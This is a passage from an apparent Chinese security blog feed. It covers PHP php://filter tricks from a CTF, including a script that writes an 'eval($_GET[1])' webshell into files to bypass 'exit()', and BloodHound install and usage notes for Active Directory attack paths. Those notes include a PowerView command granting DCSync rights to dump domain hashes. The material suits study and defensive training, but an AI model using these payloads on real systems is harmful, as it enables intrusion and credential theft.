class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-keyword">$this</span>-&gt;poc_stack) <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$item</span> == <span class="hljs-string">&#x27;string&#x27;</span>)&#123;                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatString(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>]);                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;string(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>],<span class="hljs-keyword">$this</span>-&gt;poc);            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;convert&#x27;</span>)&#123;                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatConvert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>]);                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;convert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc);            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;$zlib&#x27;</span>)&#123;                ;            &#125;        &#125;        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$result</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;length:&quot;</span>,strlen(<span class="hljs-variable">$tmp</span>),<span class="hljs-string">&quot;\n&quot;</span>;        <span class="hljs-variable">$padding</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-string">&#x27;convert&#x27;</span>][<span class="hljs-string">&#x27;from&#x27;</span>])&#123;            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;UCS-2LE&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>:                <span class="hljs-variable">$paddingnum</span> = strlen(<span class="hljs-variable">$tmp</span>)%<span class="hljs-number">2</span>;                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$paddingnum</span> !== <span class="hljs-number">0</span>)&#123;                    <span class="hljs-variable">$padding</span> = str_repeat(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-variable">$paddingnum</span>);                &#125;                <span class="hljs-keyword">break</span>;            <span class="hljs-keyword">default</span>:                ;        &#125;                <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$padding</span>;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;poc;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;end;        <span class="hljs-keyword">echo</span> substr(<span class="hljs-variable">$result</span>,strlen(<span class="hljs-keyword">$this</span>-&gt;prefix)),<span class="hljs-string">&quot;\n&quot;</span>;    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Generate();<span class="hljs-variable">$a</span>-&gt;Run();</code></pre></div><h3 id="zlib-deflate与zlib-inflate"><a href="#zlib-deflate与zlib-inflate" class="headerlink" title="zlib.deflate与zlib.inflate"></a>zlib.deflate与zlib.inflate</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = [    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,    <span class="hljs-string">&#x27;ASCII&#x27;</span>,    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,    <span class="hljs-string">&#x27;SJIS&#x27;</span>,    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,    <span class="hljs-string">&#x27;CP932&#x27;</span>,    <span class="hljs-string">&#x27;CP51932&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;JIS&#x27;</span>,    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,    <span class="hljs-string">&#x27;CP50220&#x27;</span>,    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,    <span class="hljs-string">&#x27;CP50221&#x27;</span>,    <span class="hljs-string">&#x27;CP50222&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,    <span class="hljs-string">&#x27;byte2be&#x27;</span>,    <span class="hljs-string">&#x27;byte2le&#x27;</span>,    <span class="hljs-string">&#x27;byte4be&#x27;</span>,    <span class="hljs-string">&#x27;byte4le&#x27;</span>,    <span class="hljs-string">&#x27;BASE64&#x27;</span>,    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,    <span class="hljs-string">&#x27;7bit&#x27;</span>,    <span class="hljs-string">&#x27;8bit&#x27;</span>,    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,    <span class="hljs-string">&#x27;CP936&#x27;</span>,    <span class="hljs-string">&#x27;GB18030&#x27;</span>,    <span class="hljs-string">&#x27;HZ&#x27;</span>,    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,    <span class="hljs-string">&#x27;CP950&#x27;</span>,    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,    <span class="hljs-string">&#x27;UHC&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,    <span class="hljs-string">&#x27;CP866&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,];@mkdir(<span class="hljs-string">&#x27;./test&#x27;</span>);@chdir(<span class="hljs-string">&#x27;./test&#x27;</span>);<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;php://filter/zlib.deflate|&#x27;</span> . <span class="hljs-variable">$item</span> . <span class="hljs-string">&#x27;|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e&#x27;</span>.<span class="hljs-variable">$item</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;    file_put_contents(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span> . <span class="hljs-variable">$content</span>);&#125;</code></pre></div><h1 id="参考及转载资料"><a href="#参考及转载资料" class="headerlink" title="参考及转载资料"></a>参考及转载资料</h1><ul><li><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></li><li><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">关于file_put_contents的一些小测试</a></li><li><a href="https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/">WMctf2020 Checkin出题想法&amp;题解</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>文件包含</category>
      
      <category>php</category>
      
      <category>伪协议</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>web安全</tag>
      
      <tag>ctf</tag>
      
      <tag>文件包含</tag>
      
      <tag>php://filer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透分析工具 BloodHound-基本安装</title>
    <link href="/2020/10/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound-%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85/"/>
    <url>/2020/10/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound-%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-BloodHound简介"><a href="#0x01-BloodHound简介" class="headerlink" title="0x01 BloodHound简介"></a>0x01 BloodHound简介</h1><blockquote><p>BloodHound 是一个免费的工具。BloodHound 以用图与线的形式将域内用户、计算机、组、会话、ACL 及域内所有相关用户、组、计算机、登录信息、访问控制策略之间的关系直观地展现 在 Red Team 成员面前，更便捷地分析域内情况，更快地在域内提升权限。BloodHound 也可以使Blue Team 成员对己方网络系统进行更好的安全检测，以及保证域的安全性。BloodHound 使用图形理论，自动化地在 Active Directory 环境中理清大部分人员之间的关系和细节。使用 BloodHound，可以快速地深入了解 AD 中的一些用户关系、哪些用户具有管理员权限、哪些用户有权对任何计算机都拥有管理权限，以及有效的用户组成员信息。</p><p>BloodHound 通过在域内导出相关信息，在将数据采集后，将其导入本地安装好的 Neo4j 数据库中，展示和分析域内所需相关信息。Neo4j 是一款 NoSQL 图形数据库，它将结构化数据存储在网络上而不是表中。Bloodhound 正是利用这种特性加以合理分析，更加直观地以节点空间的形式来表达相关数据。Neo4j就像MySQL或其他数据库一样，有自己的查询语言Cypher Query Language。因为 Neo4j 是一款非关系型数据库，要想用它查询数据，同样需要自己独特的语法。</p></blockquote><h1 id="0x02-BloodHound-安装"><a href="#0x02-BloodHound-安装" class="headerlink" title="0x02 BloodHound 安装"></a>0x02 BloodHound 安装</h1><h2 id="windows安装"><a href="#windows安装" class="headerlink" title="windows安装"></a>windows安装</h2><blockquote><p>参考：《内网安全攻防-渗透测试实战指南》</p></blockquote><p>首先，准备一台安装有 Windows Server 操作系统的机器。为了方便、快捷地使用 Neo4j 的 Web管理界面，推荐安装 Chrome 或火狐浏览器。</p><p>Neo4j 数据库需要 Java 环境才能运行。从 Oracle 官方网站下载 JDK Windows x64 安装包并安装，如图 2-86 所示。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021083717373.png" alt="image-20201021083717373"></p><p>在 Neo4j 官方网站的社区服务版模块中选择“Windows”选项，并下载最新的 Neo4j 数据库</p><p>安装包（写作本书时的最新版为 3.5.1），如图 2-87 所示。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021083759178.png" alt="image-20201021083759178"></p><p>下载完成并解压，打开 cmd 窗口，进入解压后的 bin 目录。在 cmd 下输入命令“neo4j.bat console”，启动 Neo4j 服务</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210314192242503.png" alt="image-20210314192242503"></p><p>看到服务成功启动的提示后，打开浏览器，输入地址“<a href="http://127.0.0.1:7474/browser/%E2%80%9D%E3%80%82%E6%89%93%E5%BC%80%E9%A1%B5">http://127.0.0.1:7474/browser/”。打开页</a> 面后，输入账号和密码</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021083826943.png" alt="image-20201021083826943"></p><p>Neo4j 默认的配置信息如下。 </p><ul><li>Host：<a href="http://127.0.0.1:7474。">http://127.0.0.1:7474。</a> </li><li>User：neo4j。 </li><li>Password：neo4j</li></ul><p>输入完成后，提示修改密码。在这里，为了方便演示，将密码修改为“123456”。在 GitHub 的 BloodHound 项目中提供了其 Release 版本，下载地址为 <a href="https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip%E3%80%82%E8%AF%BB%E8%80%85%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%80%89%E6%8B%A9%E4%B8%8B%E8%BD%BD%E6%BA%90%E4%BB%A3%E7%A0%81%E8%87%AA%E5%B7%B1%E6%9E%84%E5%BB%BA%E3%80%82%E5%9C%A8%E8%BF%99%E9%87%8C%EF%BC%8C%E9%80%89%E6%8B%A9%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD">https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip。读者也可以选择下载源代码自己构建。在这里，选择直接下载</a> Release 版本，</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021083912433.png" alt="image-20201021083912433"></p><p>下载完成后进行解压，进入目录，找到 BloodHound.exe，双击运行</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021083920276.png" alt="image-20201021083920276"></p><ul><li>Database URL：bolt://localhost:7687。</li><li>DB Username：neo4j。</li><li>DB Password：123456</li></ul><p>输入以上信息后，单击“Login”按钮，进入 BloodHound 主界面，如图 2-92 所示。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021084133494.png" alt="image-20201021084133494"></p><p>现在，Bloodhound 已经安装成功了。</p><h2 id="kali-linux安装"><a href="#kali-linux安装" class="headerlink" title="kali linux安装"></a>kali linux安装</h2><blockquote><p>参考：<a href="https://blog.csdn.net/Alexhcf/article/details/113030110">BloodHound工具安装、启动</a></p></blockquote><p><code>sudo apt-get install bloodhound </code></p><p>安装完成后，先启动neo4j</p><p><code>sudo neo4j console </code></p><p>启动成功后访问<a href="http://localhost:7474/browser/">http://localhost:7474/browser/</a></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20210123100540637.png" alt="在这里插入图片描述"></p><p>User默认 neo4j</p><p>Password默认 neo4j<br>其他不用改</p><p>连接成功后就会提示创建新密码</p><p>接下来在终端输入bloodhound<br>会启动bloodhound的图形化页面，然后输入neo4j的账号密码即可</p><h1 id="0x03-BloodHound基本使用"><a href="#0x03-BloodHound基本使用" class="headerlink" title="0x03 BloodHound基本使用"></a>0x03 BloodHound基本使用</h1><p>BloodHound 所需要的三条信息严重依赖于 PowerView.ps1 脚本的 BloodHound。BloodHound分为两个版本，一个是 PowerShell 采集器脚本SharpHound.ps1、另一个是 exe 可执行文件 SharpHound.exe</p><p>地址为：</p><div class="hljs code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BloodHoundAD/</span>BloodHound<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/Collectors/</span>SharpHound.exehttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BloodHoundAD/</span>BloodHound<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/Collectors/</span>SharpHound.ps1</code></pre></div><p>最新版本SharpHound.exe 需要.net framework 4才可以正常运行，如在是在win server2008中的报错结果。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210314195450174.png" alt="image-20210314195450174"></p><p>在win server 2012中正常运行</p><p>可以得到一个zip文件，将此文件拖出，然后直接拖入BloodHound界面。</p><p>点击旁边的预置脚本即可看到图形化结果。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210314200854763.png" alt="image-20210314200854763"></p><blockquote><p>老版本的SharpHound可以在.net低版本中运行，但是产生结果正常导入新版本的BloodHound。如果遇到.net的问题，可以安装低版本的BloodHound进行分析。</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://blog.csdn.net/Alexhcf/article/details/113030110">BloodHound工具安装、启动</a></li><li>《内网安全攻防-渗透测试实战指南》</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
      <category>内网渗透</category>
      
      <category>BloodHound</category>
      
      <category>BloodHound</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
      <tag>BloodHound</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透分析工具 BloodHound-预置功能学习与记录</title>
    <link href="/2020/10/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound-%E9%A2%84%E7%BD%AE%E5%8A%9F%E8%83%BD%E5%AD%A6%E4%B9%A0%E4%B8%8E%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/10/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound-%E9%A2%84%E7%BD%AE%E5%8A%9F%E8%83%BD%E5%AD%A6%E4%B9%A0%E4%B8%8E%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-BloodHound简介"><a href="#0x01-BloodHound简介" class="headerlink" title="0x01 BloodHound简介"></a>0x01 BloodHound简介</h1><blockquote><p>BloodHound 是一个免费的工具。BloodHound 以用图与线的形式将域内用户、计算机、组、会话、ACL 及域内所有相关用户、组、计算机、登录信息、访问控制策略之间的关系直观地展现 在 Red Team 成员面前，更便捷地分析域内情况，更快地在域内提升权限。BloodHound 也可以使Blue Team 成员对己方网络系统进行更好的安全检测，以及保证域的安全性。BloodHound 使用图形理论，自动化地在 Active Directory 环境中理清大部分人员之间的关系和细节。使用 BloodHound，可以快速地深入了解 AD 中的一些用户关系、哪些用户具有管理员权限、哪些用户有权对任何计算机都拥有管理权限，以及有效的用户组成员信息。</p></blockquote><h1 id="0x02-BloodHound预置分析功能"><a href="#0x02-BloodHound预置分析功能" class="headerlink" title="0x02 BloodHound预置分析功能"></a>0x02 BloodHound预置分析功能</h1><p>目前（2021年3月），BloodHound内置25个功能。</p><h2 id="0-预置功能列表"><a href="#0-预置功能列表" class="headerlink" title="0. 预置功能列表"></a>0. 预置功能列表</h2><ul><li><strong>Find all Domain Admins</strong> 查找所有域管理员</li><li><strong>Find Shortest Paths to Domain Admins</strong> 查找到域管理员的最短路径</li><li><strong>Find Principals with DCSync Rights</strong> 查找具有DCSync权限的主体</li><li><strong>Users with Foreign Domain Group Membership</strong> 具有外部域组成员资格的用户</li><li><strong>Groups with Foreign Domain Group Membership</strong> 具有外部域组成员身份的组</li><li><strong>Map Domain Trusts</strong> 映射域信任</li><li><strong>Shortest Paths to Unconstrained Delegation Systems</strong> 无约束委托系统的最短路径</li><li><strong>Shortest Paths from Kerberoastable Users</strong> 用户的最短路径</li><li><strong>Shortest Paths to Domain Admins from Kerberoastable Users</strong> Kerberoastable用户到域管理员的最短路径</li><li><strong>Shortest Path from Owned Principals</strong> 从拥有的主体的最短路径</li><li><strong>Shortest Paths to Domain Admins from Owned Principals</strong> 从拥有的主体到域管理员的最短路径</li><li><strong>Shortest Paths to High Value Targets</strong> 通往高价值目标的最短路径</li><li><strong>Find Computers where Domain Users are Local Admin</strong> 查找域用户为本地管理员的计算机</li><li><strong>Find Computers where Domain Users can read LAPS passwords</strong> 查找域用户可以读取LAPS密码的计算机</li><li><strong>Shortest Paths from Domain Users to High Value Targets</strong> 从域用户到高价值目标的最短路径</li><li>**Find All Paths from Domain Users to High Value Targets **查找从域用户到高价值目标的所有路径</li><li><strong>Find Workstations where Domain Users can RDP</strong> 查找域用户可以RDP的工作站</li><li><strong>Find Servers where Domain Users can RDP</strong> 查找域用户可以RDP的服务器</li><li>**Find Dangerous Rights for Domain Users Groups **查找域用户组的危险权限</li><li><strong>Find Kerberoastable Members of High Value Groups</strong> 寻找高价值群体中的Kerberosatable成员</li><li><strong>List all Kerberoastable Accounts</strong> 列出所有Kerberostable帐户</li><li><strong>Find Kerberoastable Users with most privileges</strong> 查找拥有最多权限的Kerberostable用户</li><li><strong>Find Domain Admin Logons to non-Domain Controllers</strong> 查找到非域控制器的域管理员登录</li><li><strong>Find Computers with Unsupported Operating Systems</strong> 查找具有不受支持的操作系统的计算机</li><li><strong>Find AS-REP Roastable Users (DontReqPreAuth)</strong> 查找AS-REP Roastable用户（DontReqPreAuth）</li></ul><p>对于一个内网新手来说，以上的很多功能暂时都无法理解，很多前辈的分析可以帮助我们理解每一个功能，笔者在此进行摘录与汇总。</p><h2 id="1-Find-all-Domain-Admins-查找所有域管理员"><a href="#1-Find-all-Domain-Admins-查找所有域管理员" class="headerlink" title="1. Find all Domain Admins 查找所有域管理员"></a>1. Find all Domain Admins 查找所有域管理员</h2><p>单击“Find all Domain Admins”选项，选择需要查询的域名进行查询，如图 2-98 所示。BloodHound 可以帮助我们查询出当前域中有多少个域管理员。可以看到，当前域中有 15 个域管理员权限的用户。按“Ctrl”键，将循环显示默认阈值、始终显示、从不显示三个选项，以显示不同的节点标签，也可以单击并按住某个节点，将其拖动到其他位置。 </p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021093359537.png" alt="image-20201021093359537" style="zoom:150%;" /><h2 id="2-Find-Shortest-Paths-to-Domain-Admins-寻找到达域管理员的最短路径"><a href="#2-Find-Shortest-Paths-to-Domain-Admins-寻找到达域管理员的最短路径" class="headerlink" title="2. Find Shortest Paths to Domain Admins 寻找到达域管理员的最短路径"></a>2. Find Shortest Paths to Domain Admins 寻找到达域管理员的最短路径</h2><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210314155338260.png" alt="image-20210314155338260" style="zoom:150%;" /><p>单击“Find Shortest Paths to Domain Admins”选项，使用 BloodHound 进行分析，如图 2-99 所示。BloodHound 列出了数条路径可以到达域管理员的路径。</p><ul><li><p>左上角为目标域管理员组，既是本次渗透测试的核心目标，也是图中的一个节点，还是所有路线的尽头。</p></li><li><p>左下角第一条线路上的三个用户，属于第一个节点的组，第一节点组又在第二节点组内。第二节点组对其上部的第三节点的用户具有权限，而该用户又是上一台（第四个节点）计算机的本地管理员，可以在这台计算机上拿到上面一个（第五个节点）用户的会话。该用户属于 Domain Admins 组，可以通过 PTH 方法获取域管理员和域控制器。在第三个节点分支中的用户，可以对处于第三个节点的用户强制推送策略，直接修改第三个节点用户的密码，进而再次通过 PTH 拿下第四个节点，依此类推。 </p></li><li><p>中间的一组，第一个节点中的三个用户为域管理员委派服务账号，可以对该域的域控制器进行 dcsync 同步，将第二个节点的用户（属于 Domain Admins 组）的散列值同步过来，进而获取域控制器权限。 </p></li><li><p>右边的组，第一个节点的用户是第二个节点计算机的本地管理员，在该计算机上可以获得第三个节点的用户散列值。第三个节点用户又属于第四个节点的组。第四节点组是第五个节点计算机的本地管理员组，在该计算机可以获取第五个节点用户（属于 Domain Admins组）的散列值，进而获取域控制器权限。</p></li></ul><h2 id="3-Find-Principals-with-DCSync-Rights-查找具有DCSync权限的主体"><a href="#3-Find-Principals-with-DCSync-Rights-查找具有DCSync权限的主体" class="headerlink" title="3. Find Principals with DCSync Rights 查找具有DCSync权限的主体"></a>3. Find Principals with DCSync Rights 查找具有DCSync权限的主体</h2><p><strong>DCsync知识补充</strong></p><blockquote><p>DCsync大致原理是通过<code>GetNCChanges</code>请求域控制器（利用<code>Directory Replication Service</code>协议）复制用户凭据。</p><p><strong>利用条件：</strong></p><p>获得以下任一用户的权限：</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p><strong>利用方法：</strong></p><p>具体可参考：<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/">域渗透——DCSync</a></p></blockquote><blockquote><p>运行DCSync需要特殊权限，<code>Administrators</code>组、<code>Domain Admins</code>组或<code>Enterprise Admins</code>组以及域控中的任何成员都通过DCSync来提取用户凭证。<strong>如果配置不当，可导致普通用户也能具有DCsync权限</strong></p></blockquote><p>如果普通用户想具有DCsync权限，可以给对象添加以下三条ACE：</p><ul><li><code>DS-Replication-Get-Changes</code>，对应GUID为：<code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code></li><li><code>DS-Replication-Get-Changes-All</code>，对应GUID为：<code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code></li><li><code>DS-Replication-Get-Changes-In-Filtered-Set</code>，对应GUID为：<code>89e95b76-444d-4c62-991a-0facbeda640c</code></li></ul><p>powerview模块集成了添加<code>DCsync</code>权限的方法，所以我们不需要一个一个添加了</p><div class="hljs code-wrapper"><pre><code class="hljs coq"><span class="hljs-keyword">Add</span>-DomainObjectAcl -TargetIdentity <span class="hljs-string">&quot;DC=test,DC=local&quot;</span> -PrincipalIdentity qiyou -Rights DCSync -<span class="hljs-keyword">Verbose</span></code></pre></div><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200229210337-e62969d8-5af3-1.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229210337-e62969d8-5af3-1.png" alt="img"></a></p><p>回到BloodHound</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229210241-c4febd30-5af3-1.png" alt="img"></p><p>利用用户qiyou即可dump出域内所有用户的hash</p><h2 id="4-Users-with-Foreign-Domain-Group-Membership-具有外部域组成员资格的用户"><a href="#4-Users-with-Foreign-Domain-Group-Membership-具有外部域组成员资格的用户" class="headerlink" title="4. Users with Foreign Domain Group Membership 具有外部域组成员资格的用户"></a>4. Users with Foreign Domain Group Membership 具有外部域组成员资格的用户</h2><p><strong>知识补充</strong></p><blockquote><p><strong>外部域</strong></p><p>当林中的域与林之外的域之间建立信任关系时，来自外部域的安全主体可以访问内部域中的资源。</p></blockquote><p>活动目录AD中就有一栏：ForeignSecurityPrincipals，：代表域中来自森林外部域的组中的成员</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/v2-9f8dfbd03eb6662caa1b58952241682e_r.jpg" alt="preview"></p><p>如果我们控制的用户具有访问外部域的权限，我们即可考虑跨域攻击</p><h2 id="5-Shortest-Paths-to-Unconstrained-Delegation-Systems-无约束委托系统的最短路径"><a href="#5-Shortest-Paths-to-Unconstrained-Delegation-Systems-无约束委托系统的最短路径" class="headerlink" title="5. Shortest Paths to Unconstrained Delegation Systems 无约束委托系统的最短路径"></a>5. Shortest Paths to Unconstrained Delegation Systems 无约束委托系统的最短路径</h2><p><strong>知识补充</strong></p><blockquote><p><strong>域委派</strong></p><p>摘自：<a href="https://www.anquanke.com/post/id/92484">利用域委派获取域管理权限</a></p><p>域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用委派可获取域管理员权限，甚至制作深度隐藏的后门。</p><p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p><p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t010f5041cb270886de.png" alt="img"></p><p>上图是经典的应用场景。一个域内普通用户jack通过Kerberos协议认证到前台WEB服后，前台运行WEB服务的服务账号websvc模拟（Impersonate）用户jack，以Kerberos协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中跳或者多跳的Kerberos认证。按照图中红色字体的数字，具体步骤如下：</p><ul><li>域内用户jack以Kerberos方式认证后访问Web服务器；</li><li>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请；</li><li>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据TGT；</li><li>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据TGS；</li><li>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据TGS；</li><li>websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</li></ul><p>域内委派主要有3种应用方式：</p><ul><li><strong>一是非约束性委派（Unconstrained 